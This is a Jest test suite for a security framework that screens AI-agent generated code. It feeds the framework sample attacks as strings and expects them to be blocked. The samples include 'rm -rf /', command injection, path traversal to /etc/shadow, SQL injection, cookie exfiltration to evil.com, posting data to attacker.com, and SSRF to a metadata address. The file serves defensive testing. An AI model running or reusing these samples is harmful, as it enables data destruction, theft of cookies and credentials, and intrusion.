/**
 * Comprehensive Attack Pattern Tests for Enhanced Security Framework
 * Tests 50+ security rules across multiple languages with production scenarios
 */

import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import {
  EnterpriseSecurityFramework,
  AgentAction,
  SecurityContext,
  SecurityConfiguration
} from '../../src/infrastructure/security/enterprise-security-framework.js';

describe('Comprehensive Attack Pattern Detection - 2025 Security Standards', () => {
  let securityFramework: EnterpriseSecurityFramework;
  let testSecurityContext: SecurityContext;
  let performanceMetrics: Array<{ 
    operation: string; 
    duration: number; 
    confidence: number; 
    riskScore: number; 
    language: string;
  }>;

  beforeEach(() => {
    const config: SecurityConfiguration = {
      analysisTimeout: 1000, // 1 second for tests
      maxCodeSize: 10 * 1024 * 1024, // 10MB for tests
      maxMemoryUsage: 512, // 512MB
      enableHybridAnalysis: true,
      confidenceThreshold: 75
    };

    securityFramework = new EnterpriseSecurityFramework(config);
    testSecurityContext = {
      userId: 'test-security-analyst',
      sessionId: `comprehensive-test-${Date.now()}`,
      permissions: ['code_generation', 'file_access', 'tool_usage'],
      environment: 'testing',
      riskProfile: 'high'
    };
    performanceMetrics = [];
  });

  afterEach(() => {
    // Analyze performance metrics
    if (performanceMetrics.length > 0) {
      const avgDuration = performanceMetrics.reduce((sum, m) => sum + m.duration, 0) / performanceMetrics.length;
      const avgConfidence = performanceMetrics.reduce((sum, m) => sum + m.confidence, 0) / performanceMetrics.length;
      const avgRiskScore = performanceMetrics.reduce((sum, m) => sum + m.riskScore, 0) / performanceMetrics.length;
      
      console.log(`Performance Summary - Avg Duration: ${avgDuration.toFixed(2)}ms, ` +
                  `Avg Confidence: ${avgConfidence.toFixed(1)}%, Avg Risk: ${avgRiskScore.toFixed(1)}`);
      
      // Log language-specific metrics
      const byLanguage = performanceMetrics.reduce((acc, m) => {
        acc[m.language] = acc[m.language] || [];
        acc[m.language].push(m);
        return acc;
      }, {} as Record<string, typeof performanceMetrics>);
      
      Object.entries(byLanguage).forEach(([lang, metrics]) => {
        const langAvgDuration = metrics.reduce((sum, m) => sum + m.duration, 0) / metrics.length;
        console.log(`${lang.toUpperCase()} - Avg Duration: ${langAvgDuration.toFixed(2)}ms (${metrics.length} tests)`);
      });
    }
  });

  describe('CRITICAL: Code Execution Attacks', () => {
    it('should detect JavaScript eval() with obfuscation attempts', async () => {
      const maliciousCode = `
        // Attempt to obfuscate eval
        const e = 'eval';
        const v = 'al';
        const dangerous = window[e + v];
        dangerous('process.exit(1)');
        
        // Also try string construction
        const evalFunc = String.fromCharCode(101, 118, 97, 108);
        window[evalFunc]('malicious code');
      `;

      const result = await analyzeCode(maliciousCode, 'javascript', 'obfuscated_eval_test');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.length).toBeGreaterThan(0);
      expect(result.violations.some(v => v.severity === 'critical')).toBe(true);
      expect(result.riskScore).toBeGreaterThan(80);
    });

    it('should detect Python exec/eval attacks', async () => {
      const pythonAttack = `
import os
import subprocess

# Direct code execution vulnerabilities
def dangerous_function(user_input):
    eval(user_input)  # Critical vulnerability
    exec("print('injected code')")  # Critical vulnerability
    __import__('os').system('rm -rf /')  # Critical vulnerability
    
# Command injection
def run_command(cmd):
    os.system(cmd)  # Command injection
    subprocess.call(cmd, shell=True)  # Command injection
    
# File manipulation
def write_file(filename, content):
    with open(filename, 'w') as f:  # File write operation
        f.write(content)
      `;

      const result = await analyzeCode(pythonAttack, 'python', 'python_execution_attacks');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.length).toBeGreaterThanOrEqual(5);
      expect(result.violations.filter(v => v.severity === 'critical').length).toBeGreaterThan(3);
      expect(result.riskScore).toBeGreaterThan(90);
    });

    it('should detect Function constructor variations', async () => {
      const constructorAttacks = `
        // Various Function constructor patterns
        const f1 = new Function('return process.env');
        const f2 = Function('console.log("injected")');
        const f3 = (function(){}).constructor('alert("xss")');
        
        // Obfuscated constructor access
        const F = [].filter.constructor.constructor;
        const f4 = new F('return document.cookie');
        
        // Template literal constructor
        const f5 = \`\${[].filter.constructor.constructor('return location.href')()}\`;
      `;

      const result = await analyzeCode(constructorAttacks, 'javascript', 'constructor_attacks');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.length).toBeGreaterThanOrEqual(2);
      expect(result.violations.some(v => v.type.includes('function_constructor'))).toBe(true);
    });
  });

  describe('HIGH: Command Injection Attacks', () => {
    it('should detect child_process exploitation patterns', async () => {
      const commandInjection = `
        const { exec, spawn, execSync } = require('child_process');
        
        function vulnerableFunction(userInput) {
          // Direct command injection
          exec(\`ls \${userInput}\`);
          execSync('cat ' + userInput);
          spawn('sh', ['-c', userInput]);
          
          // Chained command injection
          exec('echo "' + userInput + '" | sh');
          
          // Process manipulation
          process.kill(parseInt(userInput));
        }
      `;

      const result = await analyzeCode(commandInjection, 'javascript', 'command_injection');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.some(v => v.type === 'child_process_execution')).toBe(true);
      expect(result.violations.filter(v => v.severity === 'critical').length).toBeGreaterThan(0);
    });

    it('should detect file system attacks', async () => {
      const fsAttacks = `
        const fs = require('fs');
        const path = require('path');
        
        function fileSystemAttack(userPath, content) {
          // Dangerous file operations
          fs.writeFileSync(userPath, content);
          fs.unlinkSync('../../../etc/passwd');
          fs.createWriteStream('/etc/hosts');
          
          // Path traversal attempts
          const maliciousPath = '../../../etc/shadow';
          fs.readFileSync(maliciousPath);
          
          // Directory manipulation
          fs.rmdirSync('/important/data', { recursive: true });
        }
      `;

      const result = await analyzeCode(fsAttacks, 'javascript', 'filesystem_attacks');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.some(v => v.type === 'fs_dangerous_operation')).toBe(true);
      expect(result.violations.some(v => v.type === 'path_traversal_attempt')).toBe(true);
    });
  });

  describe('CRITICAL: Database Security Attacks', () => {
    it('should detect SQL injection patterns', async () => {
      const sqlInjection = `
        function vulnerableQuery(userId, userRole) {
          // Template literal SQL injection
          const query1 = \`SELECT * FROM users WHERE id = \${userId}\`;
          
          // String concatenation SQL injection
          const query2 = "SELECT * FROM users WHERE role = '" + userRole + "'";
          
          // Complex injection patterns
          const query3 = \`
            UPDATE users SET role = '\${userRole}' 
            WHERE id = \${userId}
          \`;
          
          // DROP TABLE injection
          const malicious = "'; DROP TABLE users; --";
          const query4 = "SELECT * FROM data WHERE name = '" + malicious + "'";
        }
      `;

      const result = await analyzeCode(sqlInjection, 'javascript', 'sql_injection');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.some(v => v.type === 'sql_injection_pattern')).toBe(true);
      expect(result.violations.filter(v => v.severity === 'critical').length).toBeGreaterThan(0);
    });

    it('should detect database credential exposure', async () => {
      const credentialExposure = `
        // Hardcoded database credentials
        const dbConfig = {
          host: 'localhost',
          user: 'admin',
          password: 'secret123',
          database: 'production'
        };
        
        // Connection string with credentials
        const mongoUrl = 'mongodb://admin:password123@localhost:27017/db';
        const mysqlUrl = 'mysql://root:supersecret@db.example.com:3306/app';
        
        // Environment variable patterns (less critical but flagged)
        const apiKey = process.env.SECRET_API_KEY;
      `;

      const result = await analyzeCode(credentialExposure, 'javascript', 'credential_exposure');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.some(v => v.type === 'database_credential_exposure')).toBe(true);
      expect(result.violations.some(v => v.type === 'sensitive_env_access')).toBe(true);
    });
  });

  describe('HIGH: Cryptographic Security', () => {
    it('should detect weak cryptographic algorithms', async () => {
      const weakCrypto = `
        const crypto = require('crypto');
        
        function weakEncryption(data) {
          // Weak hashing algorithms
          const md5Hash = crypto.createHash('md5').update(data).digest('hex');
          const sha1Hash = crypto.createHash('sha1').update(data).digest('hex');
          
          // Weak encryption
          const desCipher = crypto.createCipher('des', 'key');
          const rc4Cipher = crypto.createCipher('rc4', 'key');
          
          return { md5Hash, sha1Hash };
        }
      `;

      const result = await analyzeCode(weakCrypto, 'javascript', 'weak_crypto');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.some(v => v.type === 'weak_cryptography')).toBe(true);
      expect(result.violations.filter(v => v.severity === 'high').length).toBeGreaterThan(0);
    });

    it('should detect hardcoded encryption keys', async () => {
      const hardcodedKeys = `
        // Various key patterns
        const aesKey = 'thisisasecretkey1234567890abcdef'; // 32 chars
        const base64Key = 'VGhpcyBpcyBhIHNlY3JldCBrZXkgZm9yIGVuY3J5cHRpb24='; // Base64
        const hexKey = 'deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678'; // Hex
        
        // JWT secrets
        jwt.sign(payload, 'supersecretjwtkey12345', { expiresIn: '1h' });
        jwt.verify(token, 'anothersecretkey67890');
      `;

      const result = await analyzeCode(hardcodedKeys, 'javascript', 'hardcoded_keys');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.some(v => 
        v.type === 'hardcoded_encryption_key' || v.type === 'hardcoded_jwt_secret'
      )).toBe(true);
    });
  });

  describe('MEDIUM: Network Security Attacks', () => {
    it('should detect suspicious URL patterns', async () => {
      const suspiciousUrls = `
        // Suspicious external URLs
        const pastebin = 'https://pastebin.com/raw/malicious';
        const github = 'https://raw.githubusercontent.com/hacker/malware/main/payload.js';
        const bitly = 'https://bit.ly/malicious-link';
        
        // Data exfiltration URLs
        fetch('https://evil.com/exfiltrate?data=' + document.cookie);
        
        // SSRF attempts
        const internal = 'http://127.0.0.1:8080/admin';
        const metadata = 'http://169.254.169.254/metadata/v1/';
      `;

      const result = await analyzeCode(suspiciousUrls, 'javascript', 'suspicious_urls');
      
      expect(result.allowed).toBe(false);
      expect(result.violations.some(v => 
        v.type === 'suspicious_url_detected' || v.type === 'hardcoded_url'
      )).toBe(true);
    });

    it('should detect HTTP module imports', async () => {
      const httpImports = `
        import axios from 'axios';
        import fetch from 'node-fetch';
        const request = require('request');
        const http = require('http');
        const https = require('https');
        
        // Potentially suspicious usage
        axios.post('https://attacker.com', sensitiveData);
        fetch('http://localhost:8080/admin', { method: 'POST' });
      `;

      const result = await analyzeCode(httpImports, 'javascript', 'http_imports');
      
      expect(result.violations.some(v => v.type === 'http_module_import')).toBe(true);
      expect(result.violations.filter(v => v.severity === 'medium').length).toBeGreaterThan(0);
    });
  });

  describe('ADVANCED: Obfuscation & Evasion Detection', () => {
    it('should detect string obfuscation techniques', async () => {
      const obfuscatedCode = `
        // String obfuscation chains
        const decoded = 'ZXZhbA=='.split('').reverse().join('').slice(0, 4);
        const command = String.fromCharCode(101, 118, 97, 108);
        
        // Complex string manipulation
        const evil = 'live'.split('').reverse().join('') + '(malicious)';
        
        // Base64 operations
        const payload = atob('bWFsaWNpb3VzIGNvZGU=');
        const encoded = btoa('secret data');
        
        // Chained operations
        const result = 'test'.charAt(0).toUpperCase().slice(1).replace('T', 'E').concat('val');
      `;

      const result = await analyzeCode(obfuscatedCode, 'javascript', 'obfuscation_detection');
      
      expect(result.violations.some(v => 
        v.type === 'string_obfuscation' || v.type === 'base64_operation'
      )).toBe(true);
    });

    it('should detect authentication bypass patterns', async () => {
      const authBypass = `
        function checkAuth(user, password) {
          // Authentication bypass patterns
          if (true === true || user === 'admin') {
            return true; // Always passes
          }
          
          // Debug bypass
          if (process.env.NODE_ENV === 'development' || true) {
            return true;
          }
          
          // Mathematical bypasses
          if (1 === 1 && user) {
            return authenticateUser(user, password);
          }
          
          return false !== false; // Always true
        }
      `;

      const result = await analyzeCode(authBypass, 'javascript', 'auth_bypass');
      
      expect(result.violations.some(v => v.type === 'authentication_bypass')).toBe(true);
      expect(result.violations.filter(v => v.severity === 'critical').length).toBeGreaterThan(0);
    });
  });

  describe('Production Hardening & Performance', () => {
    it('should enforce timeout limits on large code analysis', async () => {
      // Create a very large code sample
      const largeCode = Array(1000).fill(`
        function normalFunction${Math.random()}() {
          eval('test'); // This should be detected
          return 'test';
        }
      `).join('\\n');

      const startTime = Date.now();
      const result = await analyzeCode(largeCode, 'javascript', 'large_code_timeout');
      const duration = Date.now() - startTime;
      
      // Should complete within timeout (1 second for tests)
      expect(duration).toBeLessThan(1500); // Allow some buffer
      expect(result).toBeDefined();
      expect(result.violations.length).toBeGreaterThan(0);
    });

    it('should handle malformed code gracefully', async () => {
      const malformedCode = `
        function broken( {
          eval('test'
          if (true {
            return false
        }
        
        const x = \`unclosed template
      `;

      const result = await analyzeCode(malformedCode, 'javascript', 'malformed_code');
      
      // Should not crash and should fall back to string matching
      expect(result).toBeDefined();
      expect(result.violations.some(v => v.type.includes('malicious_pattern'))).toBe(true);
    });

    it('should demonstrate cache performance benefits', async () => {
      const testCode = `
        function testFunction() {
          eval('cached test');
          return 'test';
        }
      `;

      // First analysis
      const start1 = Date.now();
      const result1 = await analyzeCode(testCode, 'javascript', 'cache_test_1');
      const duration1 = Date.now() - start1;

      // Second analysis (should be faster due to caching)
      const start2 = Date.now();
      const result2 = await analyzeCode(testCode, 'javascript', 'cache_test_2');
      const duration2 = Date.now() - start2;

      expect(result1.violations.length).toBe(result2.violations.length);
      expect(duration2).toBeLessThanOrEqual(duration1); // Cache should make it faster or same
      
      console.log(`Cache Performance: First: ${duration1}ms, Second: ${duration2}ms (${((1 - duration2/duration1) * 100).toFixed(1)}% improvement)`);
    });

    it('should correctly score risk levels across attack types', async () => {
      const testCases = [
        { 
          code: 'console.log("safe code");', 
          expectedRisk: 'low', 
          name: 'safe_code' 
        },
        { 
          code: 'document.getElementById("test").innerHTML = userInput;', 
          expectedRisk: 'medium', 
          name: 'xss_vulnerability' 
        },
        { 
          code: 'eval(userInput); exec(command);', 
          expectedRisk: 'critical', 
          name: 'code_execution' 
        }
      ];

      const results = [];
      for (const testCase of testCases) {
        const result = await analyzeCode(testCase.code, 'javascript', testCase.name);
        results.push({ ...testCase, result });
      }

      // Verify risk scores are properly ordered
      expect(results[0].result.riskScore).toBeLessThan(results[1].result.riskScore);
      expect(results[1].result.riskScore).toBeLessThan(results[2].result.riskScore);
      
      // Verify critical code has very high risk
      expect(results[2].result.riskScore).toBeGreaterThan(80);
    });
  });

  // Helper function
  async function analyzeCode(code: string, language: string, testName: string) {
    const startTime = Date.now();
    
    const action: AgentAction = {
      type: 'code_generation',
      agentId: `test-${testName}`,
      payload: { code, language },
      timestamp: new Date()
    };

    const result = await securityFramework.validateAgentAction(
      'comprehensive-test',
      action,
      testSecurityContext
    );

    const duration = Date.now() - startTime;
    const confidence = result.violations.length > 0 
      ? Math.max(...result.violations.map(v => v.confidence || 0))
      : 100;

    performanceMetrics.push({
      operation: testName,
      duration,
      confidence,
      riskScore: result.riskScore,
      language
    });

    return result;
  }
});